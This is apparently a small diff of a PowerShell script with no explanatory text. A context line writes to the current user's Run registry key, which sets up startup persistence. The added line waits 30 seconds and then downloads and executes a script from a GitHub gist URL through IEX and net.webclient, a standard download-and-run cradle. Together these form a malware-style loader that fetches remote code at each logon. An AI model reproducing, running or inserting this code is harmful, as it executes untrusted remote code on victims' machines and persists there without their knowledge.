@@ -5,3 +5,4 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Na
 
 
 https://gist.githubusercontent.com/HermesDerBote/ab0a481236f1372fe9c7853be96915ca/raw/2e44cf0835cc2b88cfd920a91a715e18eec69f27/gistfile1.txt
+Start-Sleep -s 30;IEX ((new-object net.webclient).downloadstring('https://gist.githubusercontent.com/HermesDerBote/ab0a481236f1372fe9c7853be96915ca/raw/864a428adbcb54273e1a76b11a3493591d57140f/gistfile1.txt')
